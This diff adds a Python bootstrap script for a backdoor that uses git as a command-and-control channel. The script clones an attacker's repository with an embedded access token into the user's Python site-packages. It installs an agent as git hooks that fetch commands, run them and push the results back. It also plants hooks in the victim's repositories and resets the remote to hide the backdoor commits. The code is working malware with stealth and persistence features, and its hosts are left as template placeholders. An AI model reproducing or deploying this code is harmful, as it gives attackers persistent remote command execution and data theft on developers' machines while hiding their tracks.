@@ -1,0 +1,225 @@
+# This will be hosted in a private GitHub gist and piped into eval()
+# on a compromised node.
+#
+# It performs the following tasks:
+# 1. Finds where on the OS python libraries are stored.
+# 2. Clones the command and control repo there.
+# 3. Installs a git hook into the backdoored repo so that whenever a git command is ran,
+#    new commands are pulled and their results pushed to the server.
+#    - The primary code that does this is placed in a git hook in the command
+#      and control repo.
+#
+# This repo includes a GitHub personal access token for the secondary account
+# so that it can receive commands and push results from the GitHub C2 repo.
+
+
+# This is the first thing ran on the victim computer after the backdoored
+# repo has been cloned. This file will be at the root of the repo
+
+import plistlib # builtin on OS X on Python 2.7
+import glob
+import sys
+import shutil
+import os
+import subprocess
+import time
+import string
+import site
+
+PUBLIC_GIT_URL = "$benign_repo"
+REPO_DIR_NAME = "$github_c2_repo_name"
+
+# The git clone URL for the command and control repo. Note that the secondary
+# user's personal access token is included in the URL so that this new machine
+# can clone and push to it.
+REPO_CLONE_URL = "$repo_clone_url"
+
+HOOK_TYPES = ["pre-push", "post-merge", "pre-commit"]
+DEFAULT_AGENT_HOOK = "post-merge.sample"
+
+def install_agent(c2_repo_base_dir, agent_code, hook_type):
+    # http://githooks.com/
+    # post-merge hook is called whenever `git pull` is ran.
+    # https://github.com/git/git/blob/master/Documentation/githooks.txt#L178
+    agent_file = os.path.join(c2_repo_base_dir, ".git", "hooks", hook_type)
+
+    with open(agent_file, "w") as f:
+        f.write(agent_code)
+
+    return agent_file
+
+# Undo any local changes that make us differ from master
+# Local changes can make mucking with branches difficult, see bootstrap_osx() for more details
+def undo_local_changes():
+    try:
+        subprocess.check_output("git checkout -- *", shell=True)
+    except subprocess.CalledProcessError: # check_output throws an exception if it returns non-zero status code
+        print("[!] Undoing local changes failed")
+        return False
+
+    return True
+
+# When this bootstrap script is ran, origin points to our backdoored repo.
+# This method makes origin point to the official benign repo, covering our tracks.
+def make_remote_benign(c2_repo_dir, benign_git_url):
+    orig_dir = os.path.abspath(os.curdir)
+
+    try:
+        os.chdir(c2_repo_dir)
+        subprocess.check_output("git remote remove origin", shell=True)
+        subprocess.check_output("git remote add origin " + benign_git_url, shell=True)
+
+        # OK, now we need to cover our tracks - we've added the backdoor code in
+        # additional commits past the benign repo's master. If we just tried to use
+        # their master directly it wouldn't delete our additional commits. So instead we:
+        # - Change to a temporary branch so we can delete master
+        # - Grab their master branch and set it to ours
+        # - Delete the temporary branch
+
+        # git checkout -b tmp
+        subprocess.check_output("git checkout -b tmp", shell=True)
+
+        # git branch -d master
+        subprocess.check_output("git branch -d master", shell=True)
+
+        # git pull origin master
+        subprocess.check_output("git pull origin master", shell=True)
+
+        # git checkout master
+        subprocess.check_output("git checkout master", shell=True)
+
+        # git branch -d tmp
+        subprocess.check_output("git branch -D tmp", shell=True)
+
+    except subprocess.CalledProcessError: # check_output throws an exception if it returns non-zero status code
+        print("[!] Changing the `origin` remote failed")
+        return False
+
+    finally:
+        os.chdir(orig_dir)
+
+def find_base_repo_dir():
+    return site.USER_SITE # default package location for pip install --user
+    # ~/Library/Python/<python_version>/lib/python/site-packages/ on OS X
+    # ~/.local/lib/python<python_version>/site-packages on Ubuntu
+
+def find_final_repo_location():
+    install_dir = find_base_repo_dir()
+    if not os.path.exists(install_dir):
+        os.makedirs(install_dir)
+
+    # the directory we're going to clone the command and control repo to
+    final_repo_location = os.path.join(install_dir, REPO_DIR_NAME)
+    if os.path.exists(final_repo_location):
+        if is_our_c2_repo(final_repo_location, DEFAULT_AGENT_HOOK):
+            return False, final_repo_location # don't need to do anything, already installed
+        else:
+            final_repo_location += "-dev"
+            if os.path.exists(final_repo_location) and is_our_c2_repo(final_repo_location, DEFAULT_AGENT_HOOK):
+                    return False, final_repo_location
+
+    return True, final_repo_location
+
+
+# Checks if `dir_path` is the root of our command and control repo
+def is_our_c2_repo(dir_path, hook_type):
+    agent_string = "hide_git_tracks" # arbitrary string that's unlikely to appear in not our hook
+
+    agent_file = os.path.join(dir_path, ".git", "hooks", hook_type)
+    if not os.path.isfile(agent_file):
+        return False
+
+    file_contents = open(agent_file, 'r').read()
+    if agent_string in file_contents:
+        return True
+
+    return False
+
+# Returns the contents of what should be placed in the agent file
+def get_agent_code(c2_base_dir):
+    # assume the agent file is agent.py in the root of the c2 repo
+    agent_file_path = os.path.join(c2_base_dir, "agent.py")
+
+    return open(agent_file_path, "r").read()
+
+# Run the agent in the command and control repo, which is responsible for
+# pulling new commands, running them, commiting the results, and pushing them
+# back to be received by the attacker server
+def run_agent(agent_path):
+    subprocess.check_output(agent_path, shell=True)
+
+# Returns the contents that are going to be written to git hooks in the targeted
+# and other git repos on the victim machine
+def get_hook_contents(agent_file_path):
+    return """#!/bin/bash
+%s &
+""" % agent_file_path
+
+def install_git_hook(git_repo_root_dir, hook_contents, hook_type):
+    hook_file = os.path.join(git_repo_root_dir, ".git", "hooks", hook_type)
+
+    with open(hook_file, "w") as f:
+        f.write(hook_contents)
+
+    subprocess.check_output("chmod u+x %s" % hook_file, shell=True)
+
+# Returns the absolute path to this base of this repo
+def find_root_of_git_repo(path):
+    cur_dir = path
+    while True:
+        cur_dir = os.path.abspath(cur_dir)
+
+        if cur_dir == "/":
+            return None
+
+        if os.path.isdir(os.path.join(cur_dir, ".git")):
+            return cur_dir
+        else:
+            cur_dir = os.path.join(cur_dir, "..")
+
+# TODO: Iterate through all dirs in base_dir and find all the git repos
+def find_git_repos(base_dir):
+    return []
+
+# Wrapper for bootstrapping that does different things based on platform
+def bootstrap():
+    need_to_clone_repo, install_dir = find_final_repo_location()
+    if not need_to_clone_repo:
+        print("[!] Backdoor repo already installed in: %s" % install_dir)
+    else:
+        if not os.path.exists(install_dir):
+            os.makedirs(install_dir)
+
+        print(install_dir)
+        subprocess.check_output("git clone %s %s" % (REPO_CLONE_URL, install_dir), shell=True)
+
+    # Install agent code in cloned command and control repo
+    agent_file_path = install_agent(install_dir, get_agent_code(install_dir), "post-merge.sample")
+    print("[*] Installing agent to: %s" % agent_file_path)
+
+    # chmod the agent so it's executable
+    subprocess.check_output("chmod u+x %s" % agent_file_path, shell=True)
+
+    run_agent(agent_file_path)
+
+    hook_types = HOOK_TYPES
+    cur_dir_root = find_root_of_git_repo(".")
+    if cur_dir_root == "/":
+        print("[!] Didn't find a git repo in this or parent directories until /")
+    else:
+        print("[*] Installing git hooks to: %s" % cur_dir_root)
+
+        for hook in hook_types:
+            install_git_hook(cur_dir_root, get_hook_contents(agent_file_path), hook)
+
+        other_git_repos = find_git_repos(os.path.join(cur_dir_root, ".."))
+        other_git_repos = [x for x in other_git_repos if x != cur_dir_root] # don't install where we already have
+        for repo in other_git_repos:
+            for hook in hook_types:
+                install_git_hook(repo, get_hook_contents(agent_file_path), hook)
+
+    # # Remove the backdoored git repo, set the public benign one to origin
+    make_remote_benign(install_dir, PUBLIC_GIT_URL)
+
+if __name__ == "__main__":
+    bootstrap()
